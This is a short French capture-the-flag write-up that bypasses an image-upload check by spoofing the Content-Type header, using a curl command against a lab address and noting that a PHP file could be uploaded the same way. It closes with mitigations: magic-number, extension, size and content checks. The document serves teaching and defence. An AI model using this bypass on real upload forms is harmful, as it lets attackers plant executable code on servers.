# Exploit 08 - file upload

Sur la page de téléchargement, il est possible de télécharger des images. Seul l'en-tête _type_ de la requête de
téléchargement semble être vérifié pour garantir que le téléchargement est une image. Nous pouvons en profiter pour
télécharger n'importe quel type de fichiers sur le serveur.

Ici, nous allons uploader un fichier texte, mais nous aurions aussi bien pu uploader un fichier php pour exécuter du
code.

```bash
curl -s -X POST "http://192.168.56.102/index.php?page=upload" -F "Upload=Upload" -F "uploaded=@"<(echo 'hello')";type=image/jpeg" | grep -oP 'The flag is : \K[0-9a-f]{64}'
```

Pour contre-carrer cette attaque, il suffirait de vérifier le contenu du fichier pour s'assurer qu'il s'agit bien d'une
image. Cela peut être fait en vérifiant le _magic number_ du fichier, qui est une séquence d'octets qui identifie le
type de fichier. On peut également vérifier l'extension du fichier pour s'assurer qu'il s'agit bien d'une image.
Sa taille peut également être vérifiée pour éviter les attaques de type _denial of service_.
Enfin on peut y rechercher des séquences de caractères spécifiques pour s'assurer que le fichier ne contient pas de code
malveillant.
